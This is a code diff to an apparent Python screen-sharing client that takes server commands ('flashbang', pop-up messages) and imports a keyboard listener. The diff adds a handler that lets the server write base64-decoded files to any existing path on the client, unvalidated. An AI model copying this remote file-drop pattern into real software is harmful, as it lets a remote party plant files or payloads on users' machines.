@@ -11,9 +11,14 @@ import os
 import subprocess
 from pynput import keyboard
 import asyncio
+import base64
 
 
 class ScreenSharingClient:
+    # ------------------------------------------------
+    # The Client Brain LOL
+    # All you need to know is... this works
+    # ------------------------------------------------
     def __init__(self, server_ip="ENDOSPC", port=5001):
         self.server_ip = server_ip
         self.port = port
@@ -37,9 +42,57 @@ class ScreenSharingClient:
     def receive_data(self):
         try:
             while True:
+                header = self.socket.recv(4)
+                if header == b"FILE":
+                    tag = self.socket.recv(5).decode("utf-8")
+                    if tag == "fileU":
+                        while True:
+                            file_name = ""
+                            location = ""
+                            data_lenght = 0
+                            while (
+                                received_character := self.socket.recv(1).decode(
+                                    "utf-8"
+                                )
+                            ) != "|":
+                                file_name += received_character
+
+                            while (
+                                received_character := self.socket.recv(1).decode(
+                                    "utf-8"
+                                )
+                            ) != "|":
+                                location += received_character
+
+                            while (
+                                received_character := self.socket.recv(1).decode(
+                                    "utf-8"
+                                )
+                            ).isdigit():
+                                data_lenght = data_lenght * 10 + int(received_character)
+                            break
+                        print(
+                            f"File Name: {file_name}\nLocation: {location}\nSize: {data_lenght}"
+                        )
+                        encoded_data = self.socket.recv(data_lenght).decode("utf-8")
+                        file_data = base64.b64decode(encoded_data.encode("ascii"))
+                        if os.path.exists(location):
+                            file_path = os.path.join(location, file_name)
+                            with open(file_path, "wb") as f:
+                                f.write(file_data)
+                            self.socket.sendall("C".encode("utf-8"))
+                            self.socket.sendall("fileUs".encode("utf-8"))
+                            print("sent affirmation")
+                        else:
+                            self.socket.sendall("C".encode("utf-8"))
+                            self.socket.sendall("fileUl".encode("utf-8"))
+                        continue
                 command = self.socket.recv(1024).decode("utf-8")
                 if command.lower() == "flashbang":
-                    self.trigger_flashbang()
+                    try:
+                        self.trigger_flashbang()
+                    except Exception:
+                        pass
                 elif command.startswith("message"):
                     message = command[7:]
                     messagebox.showinfo(title="You got a Message", message=message)
